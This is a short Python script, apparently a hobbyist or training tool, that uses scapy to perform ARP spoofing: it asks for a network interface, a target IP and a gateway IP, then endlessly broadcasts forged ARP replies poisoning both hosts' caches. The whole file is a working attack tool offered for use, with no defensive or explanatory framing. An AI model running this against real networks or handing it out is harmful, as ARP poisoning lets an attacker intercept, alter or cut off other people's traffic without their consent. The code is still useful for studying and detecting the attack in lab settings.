#!/usr/bin/env python3

import scapy.all as scapy
import time
import ipaddress
import pyfiglet

import pyfiglet

result = pyfiglet.figlet_format("ARP Spoofer")
print(result)

def get_network_interface():
    print("Available network interfaces:")
    for i, iface in enumerate(scapy.get_if_list()):
        print(f"{i+1}. {iface}")
    choice = int(input("Enter the number of the interface you want to use: ")) - 1
    return scapy.get_if_list()[choice]

def get_target_ip():
    while True:
        target_ip = input("Enter the IP address of the target device: ")
        try:
            ipaddress.IPv4Address(target_ip)
            return target_ip
        except ipaddress.AddressValueError:
            print("Invalid IP address format. Please try again.")

def get_gateway_ip():
    while True:
        gateway_ip = input("Enter the IP address of the gateway (router): ")
        try:
            ipaddress.IPv4Address(gateway_ip)
            return gateway_ip
        except ipaddress.AddressValueError:
            print("Invalid IP address format. Please try again.")

def arp_spoof(interface, target_ip, gateway_ip):
    print("Starting ARP spoofing...")
    try:
        while True:
            scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip), iface=interface, verbose=False)
            scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip), iface=interface, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nCTRL+C Detected")
        print("\nExiting The Program...")
        print("\nARP spoofing stopped.")

if __name__ == "__main__":
    interface = get_network_interface()
    target_ip = get_target_ip()
    gateway_ip = get_gateway_ip()
    arp_spoof(interface, target_ip, gateway_ip)
